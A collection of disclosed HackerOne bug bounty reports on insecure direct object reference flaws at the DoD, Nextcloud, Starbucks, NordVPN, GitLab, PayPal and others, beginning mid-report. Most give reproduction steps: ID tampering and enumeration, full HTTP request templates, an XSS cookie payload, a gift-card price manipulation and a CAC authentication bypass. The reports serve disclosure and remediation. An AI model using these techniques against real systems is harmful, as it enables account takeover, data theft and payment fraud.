Referer: https://████/members/███/
Cookie: _ga=███████; _gid=██████████; AWSALB=█████████; AWSALBCORS=█████; █████████-Http-Session=█████████; googtrans=/en/en; UserName=█████████,█████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-████; akaalb_albcommunity=██████████; AuthorizationCookie=███; BIGipServer~Sync_Only~community_pool=██████████

==RequesteeId=███████==&RequestMessage=+

##Reply:


{
"Friendship": {
"CreatedDate": "2020-04-11T08:22:53.247",
"FriendshipState": "Pending",
"LastModifiedDate": "2020-04-11T08:22:53.247",
"RequestMessage": " ",
"RequestorId": ██████,
=="RequesteeId": █████,==
"User": {
"AvatarUrl": "https://████████/cfs-file/__key/system/images/anonymous.gif",
"DisplayName": "█████",
=="ProfileUrl": "https://████/members/███████",==
"Username": "██████████",
"CurrentStatus": null,
"Id": █████████
},
"Id": ███
},
"Info": [],
"Warnings": [],
"Errors": []
}


Therefore, attacker just needs to feed the login id into the vulnerable end-point and follow the steps outlined in the PoC video to take over thousands of ██████████ user accounts!

---

### [idor on upload profile functionality ](https://hackerone.com/reports/741683)

- **Report ID:** `741683`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @risinghunter
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:12:54.195Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerable URL: https://██████████/███████ID/#Common/EditOne/Person/{account_id}
steps to reproduce:
1).browse the image and click on the upload button
2).capture this request in burp suite 
3). change the value 'personId' parameter to account2 account_id 
(please see screenshot1)
4).then goes to account2, then you will see the uploaded image is successfully goes to the approved tab 

please see video attach below you will understand completely

## Impact

an attacker is able to change profile image of any user

---

### [IDOR on update user preferences](https://hackerone.com/reports/854290)

- **Report ID:** `854290`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Palo Alto Software
- **Reporter:** @macasun
- **Bounty:** - usd
- **Disclosed:** 2020-05-13T19:52:07.215Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Team member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.

## Steps To Reproduce:

  1. Login in as user1 (the user with role `admin`) and invite user2 (set his role to `user`).
  2. Login in as user2, open Mail tab and select user1 from `Conversation assignment` dropdown (see F796149 attachment).
  3. Open network tools in the browser devTools or open local proxy and copy `UserUuid` (`da4f313f-e21e-4b5f-b2da-42d9864716f6` in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.
  4. Use template `request1` to create http request. Change `{user1-uuid}` to user1 Uuid, `{user2-cookie}` to user2 cookie. In the request body: `{attacker-email}` to email controlled by user2, `signature` to the following: `<p style=\"margin:0;\">User Signature2<img src=x onerror=alert(document.cookie) ></p>`. Send request.
  5. Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see F796148 attachment).
  6. Open https://app.outpost.co/sign-in/help and paste `{attacker-email}`. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.

## Supporting Material/References:

- request1 template:

```
PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0
Host: api.outpost.co
Content-Length: 434
Sec-Fetch-Dest: empty
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Dnt: 1
Content-Type: application/json
Accept: */*
Origin: https://app.outpost.co
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Referer: https://app.outpost.co/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7
Cookie: auth={user2-cookie}

{
  "firstName": "user1-changed-by-user2",
  "lastName": "null",
  "email": "{attacker-email}",
  "role": "USER",
  "defaultMailboxUuid": "",
  "mailboxUuids": [
    "e4a63ae3-bb10-46f8-be28-a2660a2344ec"
  ],
  "signature": "{signature}",
  "timezone": "Europe/Moscow",
  "defaultSendAndResolve": false,
  "selectFirstConversation": true
}
```

## Impact

An attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.

---

### [████ █████ exposes highly sensitive information to public](https://hackerone.com/reports/388554)

- **Report ID:** `388554`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:43:33.681Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

www.██████ is a system used by ██████ for vendors to upload details of their technology for review by ███. Due to an insecure direct object reference vulnerability, all vendor uploads are accessible to the public, without authentication. This includes `Unclass//FOUO` documents, documents labeled `ITAR RESTRICTED / EXPORT CONTROLLED DATA`, and confidential / proprietary data of the respective vendors. These documents include detailed specifications on military technology, including weapons systems, surveillance systems, missiles and ballistics, and other confidential technology.

For instance, several documents contained had labeled criminal penalties for foreign export:

```
WARNING – This document contains technical data whose export is restricted by the Arms Export Control Act (Title 22, U.S.C., Sec 2751 et seq.) or the Export Administration Act of 1979, (Title 50, U.S.C., App. 2401 et seq.), as amended. Violations of these export laws are subject to severe criminal penalties. Disseminate in accordance with provisions of DoD Directive 5230.25.
```

Although I did not identify any classified documents, there is a possibility that classified information is also uploaded here.

## Step-by-step Reproduction Instructions

1. Visit `https://www.███/api/document/x`, replacing `x` with any numerical ID. These go into the low tens of thousands.
2. Observe that the document will be downloaded, provided it exists.
3. Observe that this can be repeated for tens of thousands of documents.

Some screenshots of evidence of sensitive information attached.

## Impact

This exposes highly sensitive information of both the DoD (ITAR restricted) and proprietary/confidential company information.

---

### [Missing ownership check on remote wipe endpoint](https://hackerone.com/reports/819807)

- **Report ID:** `819807`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Nextcloud
- **Reporter:** @hitman_47
- **Bounty:** 500 usd
- **Disclosed:** 2020-04-19T13:15:25.770Z
- **CVE(s):** CVE-2020-8154

**Vulnerability Information:**

On settings/user/security

You can mark a device for wipe out that does not belong to you.

Steps:

1. Create 2 accounts one for the hacker and one for the victim
2. On both accounts add devices with different names
3.  On the hacker account, while intercepting with burpsuite, select the option to wipe out a device
4.  Forward with burpsuite and in the url that looks like settings/personal/authtokens/wipe/{data-id}, change the data-id to the id of the device of the victim
5. Stop intercepting or forward again and the device of the victim will be marked for wipe out. 

Here is a video demo 
{F748890}

## Impact

Attacker can wipe out the device of another user by using the device ID

---

### [Thailand - Insecure Direct Object Reference permits an unauthorized user to transfer funds from a victim using only the victims Starbucks card](https://hackerone.com/reports/766437)

- **Report ID:** `766437`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Starbucks
- **Reporter:** @nnez
- **Bounty:** - usd
- **Disclosed:** 2020-02-11T21:58:52.485Z
- **CVE(s):** -

**Summary (team):**

nnez discovered that a hacker could transfer funds from one Starbucks card to another by inspecting the form with Google Chrome DevTools and then change the forms "CardNumber" value to a victim's valid Starbucks card number. If the value entered for the "FullAmount" form field did not exceed the actual victim's Starbucks card balance, the transfer would generate an error message but successfully transfer the "FullAmount" value which could be validated by navigating back to the Card Information page.

@nnez — thank you for reporting the original vulnerability and for confirming the resolution.

---

### [IDOR allow access to payments data of any user](https://hackerone.com/reports/751577)

- **Report ID:** `751577`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Nord Security
- **Reporter:** @dakitu
- **Bounty:** - usd
- **Disclosed:** 2020-02-05T02:53:18.633Z
- **CVE(s):** -

**Vulnerability Information:**

simple send this POST request (no need any auth):

`POST /api/v1/orders HTTP/1.1
Host: join.nordvpn.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 179
DNT: 1
Connection: close`

`{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}`

will respond:
`{"id":42615458,"user_id":20027039,"confirmation":{"id":23093398,"created_at":"2019-12-04 17:01:35","updated_at":"2019-12-04 17:01:35","type":"redirect_post","value":"{\"url\":\"https:\\\/\\\/www.coinpayments.net\\\/index.php\",\"parameters\":{\"cmd\":\"_pay\",\"reset\":1,\"email\":\"█████\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"currency\":\"USD\",\"amountf\":125.64,\"item_name\":\"VPN order\",\"invoice\":\"49476958\",\"success_url\":\"https:\\\/\\\/join.nordvpn.com\\\/payments\\\/callback\\\/264cae0b89e44a7bd263431b68d1122d\",\"cancel_url\":\"https:\\\/\\\/join.nordvpn.com\\\/order\\\/error\\\/?error_alert=payment&eu=1\",\"want_shipping\":0}}"}}`


change user_id to 23093782 and you will get:
`{"id":42616121,"user_id":89495166,"confirmation":{"id":23093782,"created_at":"2019-12-04 17:16:14","updated_at":"2019-12-04 17:16:14","type":"redirect","value":"https:\/\/pay.gocardless.com\/flow\/RE000W16X7XH4JCXJZ623MS6H7W316N3"}}`


change id to 89495247 (my test account) and you will get:
`{"id":42616142,"user_id":89495247,"confirmation":{"id":23093800,"created_at":"2019-12-04 17:16:48","updated_at":"2019-12-04 17:16:48","type":"redirect_post","value":"{\"url\":\"https:\\\/\\\/www.coinpayments.net\\\/index.php\",\"parameters\":{\"cmd\":\"_pay\",\"reset\":1,\"email\":\"hackerhacker@test.pl\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"currency\":\"USD\",\"amountf\":125.64,\"item_name\":\"VPN order\",\"invoice\":\"49478089\",\"success_url\":\"https:\\\/\\\/join.nordvpn.com\\\/payments\\\/callback\\\/4513bd083a97e1b5c23c69096d89ac80\",\"cancel_url\":\"https:\\\/\\\/join.nordvpn.com\\\/order\\\/error\\\/?error_alert=payment&eu=0\",\"want_shipping\":0}}"}}`


Just letting You know that i submited this bug today on support@nordvpn.com from lewiatan~@ cause i wasn't able to report it via hackerone.

## Impact

leak sensitive customer data

---

### [Importing GitLab project archives can replace uploads of other users](https://hackerone.com/reports/534794)

- **Report ID:** `534794`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2019-12-11T10:39:45.788Z
- **CVE(s):** CVE-2019-5469

**Vulnerability Information:**

### Summary
Importing a modified exported GitLab project archive can overwrite uploads for other users.  If the `secret` and `file name` of an upload are known (these can be easily identified for any uploads to public repositories), any user can import a new project which overwrites the served content of the upload with arbitrary content.

This issue could be abused to backdoor project compiled binaries, allowing the spread of malware.

I have not performed a full risk assessment or root cause analysis of this issue at this time. I wanted to get the issue reported to GitLab asap after discovery. If you require any further details or information please let me know.

### Steps to reproduce
See the video below for an example of this issue:
{F466353}

The video shows the following steps:
1. As user `root` (on the left hand side of the video), create a new project
1. Upload a file to the project (e.g. by creating a new issue)
1. Take note of the file `secret` and `file name` of the original upload
1. Craft a GitLab project export tar.gz with the replacement upload file with a path equal to the original upload `secret` and `file name`, e.g. `./uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg` (See {F466355} attached)
1. As user `test` (on the right hand side of the video) create a new project, importing the crafted tar.gz from the above step
1. As the user `root` refresh your view of the upload file, and note that it has been modified

This example was demonstrated against the official GitLab docker image from https://hub.docker.com/r/gitlab/gitlab-ce/.

### Impact
Any upload type can be replaced using this method, if the `secret` and `file name` are known (these can be easily identified for any uploads to public repositories). An attacker could abuse this to backdoor project compiled binaries, allowing the spread of malware.



### Examples
See the attached project files:
1. Origin project export {F466356}
1. Modified project export used to change the upload file {F466355}

### What is the current *bug* behavior?
Importing a project as any user can modify the served upload files of other users.

### What is the expected *correct* behavior?
Importing a project should not be able to modify the served upload files of other users.

### Relevant logs and/or screenshots
See the following `/var/log/gitlab/gitlab-rails/production.log` entry:
```log
Started GET "/root/new_project/uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg" for 127.0.0.1 at 2019-04-10 23:07:12 +0000
Processing by Projects::UploadsController#show as HTML
  Parameters: {"namespace_id"=>"root", "project_id"=>"new_project", "secret"=>"[FILTERED]", "filename"=>"indi.jpg"}
Sent file /opt/gitlab/embedded/service/gitlab-rails/public/uploads/test/modified_project/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg (0.2ms)
```
Note that the request was for the `/root/new_project/uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg` file, however the file from the `test/modified_project` was  served.

### Output of checks
#### Results of GitLab environment info
GitLab docker environment:
```sh
 docker images gitlab/gitlab-ce
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
gitlab/gitlab-ce    latest              7a65562fb501        6 days ago          1.78GB
```

gitlab-rake gitlab:env:info
```sh
System information
System:
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.16.6
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.9.6
Revision:       14bac95
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     postgresql
URL:            http://gitlab.example.com
HTTP Clone URL: http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.com:some-group/some-project.git
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        8.7.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

Any upload type can be replaced using this method, if the `secret` and `file name` are known (these can be easily identified for any uploads to public repositories). An attacker could abuse this to backdoor project compiled binaries, allowing the spread of malware.

I have not performed a full risk assessment or root cause analysis of this issue at this time. I wanted to get the issue reported to GitLab asap after discovery.

---

### [IDOR on DoD Website exposes FTP users and passes linked to all accounts!](https://hackerone.com/reports/228383)

- **Report ID:** `228383`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:21:57.473Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
https://████/██████/ is vulnerable to Insecure Direct Object Reference. The application does not validate whether or not who a Push Server belongs to thus allowing an attacker to view the credentials of any FTP / sFTP server linked to any user's account. 

## Impact
An attacker can view anybody's FTP server information, thus **compromising** the user's FTP servers. This also allows an attacker to **update** or **edit** the Push Server in the ██████████ CMS.

## Step-by-step Reproduction Instructions
1. Log into or create an account on `https://██████████/██████████`
2. Now visit `https://████████/█████/filepush/ftp/303/` 

You will be able to see my ftp server details and you will be able to update or delete it!

An attacker can bruteforce the id to see if the server gives back a valid response. The attacker can then log into the person's FTP servers with the credentials stolen using this vulnerability, giving them full access to private / confidential information!

Example: `https://██████████/█████████/filepush/ftp/1/`

Hostname: ██████
Username: ██████
Password: █████
Path: /from_pub/cr/████████

`https://█████████/████/filepush/ftp/<ID>/`

## Suggested Mitigation/Remediation Actions
Check whether or the user's account should have access to the specified Push Server

---

### [IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users](https://hackerone.com/reports/415081)

- **Report ID:** `415081`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** PayPal
- **Reporter:** @born2hack
- **Bounty:** 10500 usd
- **Disclosed:** 2019-07-30T13:10:01.684Z
- **CVE(s):** -

**Summary (team):**

PayPal Business Accounts allow account owners to create multiple secondary users with specific privileges assigned to their employees. This submission identified a method that made it possible for a Business Account owner to assign secondary users from other accounts. The new secondary user would be granted access to the login allowing for unauthorized access to the functions of that single user login. PayPal remediated the vulnerability and found no evidence of abuse associated with it.

---

### [Access to all █████████ files, including CAC authentication bypass](https://hackerone.com/reports/429000)

- **Report ID:** `429000`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2019-04-08T17:04:41.451Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Due to an Insecure Direct Object Reference (IDOR) in adding recipients to a shared package on ██████████, an unauthenticated attacker can access all files uploaded to ████. As described on ██████████ website, this includes documents with classifications up to FOUO, including PII / PHI Privacy Act data, and documents classified `FOUO//CLOSE HOLD`, `FOUO//SENSITIVE`, and `FOUO//LIMITED DISTRIBUTION DOCUMENT`.

Additionally, █████ enforces CAC pickup requirements to require users to first authorize via CAC. This too, can be bypassed, allowing an attacker to download any file sent over ████.

Note that in addition to this vulnerability, other IDORs exist in sensitive areas, such as confirming email addresses, allowing an attacker to pretend to send documents from any email address.

## Impact

Based on analysis of file ids, over 2000 documents are uploaded per hour to ███. When combined with a ██████, this exposes over 500,000 recent documents and new documents that are sent every hour. Additionally, as metadata for historical documents is not purged, this also includes details such as sender names/emails, file descriptions, and share dates for over 15 million past documents.

## Step-by-step Reproduction Instructions

1. Visit████/Default.aspx and proceed to send a file to yourself.
2. Click through the verification email and verify the file.
3. Log in to the Package Status page at███/StatusLogIn.aspx?PackageID=x using the provided password.
4. Intercept the request to add a new recipient via the recipients list, entering your email address as the email to add. This is a `POST` request to `POST /████████/Status.aspx?ID=x`.
5. Modify the `ID` parameter to any other number, e.g. decrement the number by 1.
6. Observe that the package will be sent to your email, which can then be downloaded using the provided password.
7. Repeat with any numeric ID to download hundreds of thousands of files.

To bypass CAC authentication:

A user can elect to require CAC authentication when downloading a file. This can be bypassed via the normal file download flow.

1. Visit█████/███?id=15745307 (the initial file ID here does not matter).
2. Enter the password emailed for the file that requires CAC authentication.
3. Intercept the request to submit the form. Replace the `id` parameter in the url with the id of the file with CAC authentication.
4. Observe that the file's information will be displayed and can be downloaded.

## Suggested Mitigation/Remediation Actions
- Ensure that a user can only modify their own packages
- Ensure that a file cannot be downloaded without CAC authentication
- Ensure that a user can only verify their own packages.

## Impact

.

---

### [███████ Site Exposes █████████ forms](https://hackerone.com/reports/395246)

- **Report ID:** `395246`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2019-04-05T19:45:03.914Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

The █████ site (https://██████.mil/) allows authenticated users to submit ██████ e-forms. Due to a vulnerability in this system, any authenticated user can access the full █████████ e-form of any other user.

## Steps to reproduce

1. Intercept an authenticated request on █████████ containing an Authorization header.
2. Replace the url with `█████████`. Observe that the id in the url can be incremented/decremented to view recently generated OMPFs.
3. Upon submitting the request, the user's full ███████ form JSON response will be sent.

## Impact

Access to ████ is possible through either a Department of Defense Self-Service logon, CAC card, or █████████password. Thus, a compromise of a single account on any of these systems would allow for unrestricted access to all ████ forms.

The ████ form includes the following
- PII such as SSN, DoB, addresses, etc
- Personal remarks
- Other fields related to security clearances, education, maritial status, etc

---

### [Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details](https://hackerone.com/reports/447930)

- **Report ID:** `447930`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2019-01-11T21:37:05.439Z
- **CVE(s):** -

**Vulnerability Information:**

It's possible for an attacker to enumerate embedded submission form UUIDs through HackerOne's GraphQL node interface. In normal application behavior, an embedded submission form is queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute force attacks. However, the UUID is not the primary key of these models. Instead, in the backend, it still has an auto incremental primary key. Because of that they can be queried directly using the node interface. From the node interface, the UUID is exposed, which can then be used to obtain the same information an invited reporter can access.

# Proof of concept
In order to reproduce the vulnerability, follow the steps below.

 - consider the following node ID: `Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==`
 - decode the ID (base64), which will look something like `gid://hackerone/EmbeddedSubmissionForm/9`
 - change the primary key identifier, and base64 encode it
 - execute the following GraphQL query:

**Request**
```
query {
  node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") {
    ... on EmbeddedSubmissionForm {
      uuid
    }
  }
}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "████"
    }
  }
}
```

 - take the UUID, and append `?embedded_submission_form_uuid=:uuid` to the GraphQL request
 - submit the following query to obtain the program information:

**Request**
```
POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
Host: hackerone.com
...

{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "███",
      "team": {
        "handle": "██████████",
        "policy": "The policy."
      }
    }
  }
}
```

## Impact

Any unauthenticated user can obtain the same information about a private program as a participating hacker. This may reveal sensitive information about private programs on HackerOne, such as their policy, terms, resolved bug count, bounty table, etc.

There are essentially two vulnerabilities here: the ability to directly query the `EmbeddedSubmissionForm` object and the fact that by specifying a UUID, the `Team` object exposes too much information.

---

### [Able to purchase a gift card with any amount](https://hackerone.com/reports/316789)

- **Report ID:** `316789`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Starbucks
- **Reporter:** @qwacsawd
- **Bounty:** - usd
- **Disclosed:** 2018-07-20T20:10:42.471Z
- **CVE(s):** -

**Vulnerability Information:**

**Description**
There is a vulnerability in card.starbucks.com.sg that allows an attacker to modify the purchasing value of a starbucks gift card such that he is paying the minimum amount for the maximum value of the gift card.

**Attack Summary**
An attacker is able to pay $0.01 for a $100 gift card and gift the card to himself thus allowing him to use the card.

**Steps to Reproduce**
1)Visit https://card.starbucks.com.sg/egift/cards.php?cat=Singapore%20Exclusive
2)Fill in the relevant values, set the emails to your starbucks account email and the input value to $300 at the start
3)Use a web proxy to monitor the web traffic and click on the check out button.
4)Change the original values of the request from 
txtAmount=300&amount=300&txtCustomAmount=300 to txtAmount=0.1&amount=0.1&txtCustomAmount=0.1 and submit the request
5)An encoded string of the value 0.1 will be displayed in the following request as vpc_Amount=XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D, where =XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D is the value 0.1
5)Copy that string and drop the entire request
7)Repeat step 1 to 4, this time change ONLY the value in the variable "amount" so the request would look like this:
txtAmount=300&amount=300&txtCustomAmount=300 to txtAmount=300&amount=0.1&txtCustomAmount=300
8)Proceed to click on the check out button and you will be brought from https://card.starbucks.com.sg/egift/checkout.php to https://card.starbucks.com.sg/egift/payment.php where the vpc_Amount is showed in the request. Change the original vpc_Amount value to the copied string XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D
9)Proceed on to submit the request and you will be brought over to the payment page by either visa/mastercard
10)Continue payment as per usual and you will be paying $0.1 for a $300 starbucks card.
11)Since the recipient email is the attacker's email he checks his email to redeem the card and adds it into his starbucks account.
12)The attacker now has a $300 starbucks gift card that he only paid $0.1 for.

## Impact

By abusing this function, an attacker could gain unlimited values for his starbucks card.

---

### [View & add to cart unlisted items via IDOR](https://hackerone.com/reports/344284)

- **Report ID:** `344284`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Instacart
- **Reporter:** @bigshaq
- **Bounty:** - usd
- **Disclosed:** 2018-05-25T00:24:38.584Z
- **CVE(s):** -

**Summary (team):**

Access Control vulnerability that would let an attacker order certain items from the API, even though they are missing from the Web catalog

---

### ['cnvID' parameter vulnerable to Insecure Direct Object References](https://hackerone.com/reports/265284)

- **Report ID:** `265284`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Concrete CMS
- **Reporter:** @testdefense
- **Bounty:** - usd
- **Disclosed:** 2018-04-15T03:48:56.561Z
- **CVE(s):** -

**Vulnerability Information:**

Installation Information
===
IIS 8, PHP 5.5, Concrete5 (5.7.5.7) [Default install]
### Issue POC
An unauthenticated user can enumerate comments from all blog posts by POSTing requests to /index.php/tools/required/conversations/view_ajax with incremental 'cnvID' integers.

1. An example blog with permissions set for READ/WRITE to Administrators only {F217708}
2. A comment entry with sensitive data (this could be PII or any other type of sensitive data posted by users) {F217710}
3. POST request by a malicious user without authentication {F217711}
4. Enumeration of comments via brute of 'cnvID' {F217712}

Remediation
---
Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename):
1. Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s ESAPI includes both sequential and random access reference maps that developers can use to eliminate direct object references.
2. Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.

References
---
[OWASP Top 10 2010-A4-Insecure Direct Object References](https://www.owasp.org/index.php/Top_10_2010-A4-Insecure_Direct_Object_References)
Also, crayons

---

### [[www.zomato.com] IDOR - Leaking all Personal Details of all Zomato Users through an endpoint](https://hackerone.com/reports/269937)

- **Report ID:** `269937`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Eternal
- **Reporter:** @prateek_0490
- **Bounty:** - usd
- **Disclosed:** 2017-10-27T05:17:30.044Z
- **CVE(s):** -

**Summary (team):**

Hacker is able to get the PI(Personal Information) of any Zomato user.

---

### [IDOR to cancel any table booking and leak sensitive information such as email,mobile number,uuid](https://hackerone.com/reports/265258)

- **Report ID:** `265258`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Eternal
- **Reporter:** @darwinks
- **Bounty:** 250 usd
- **Disclosed:** 2017-10-22T08:49:55.334Z
- **CVE(s):** -

**Summary (team):**

Hacker is able to cancel the other user's table booking, The same request leaked the private information of the user (email & mobile no).

---
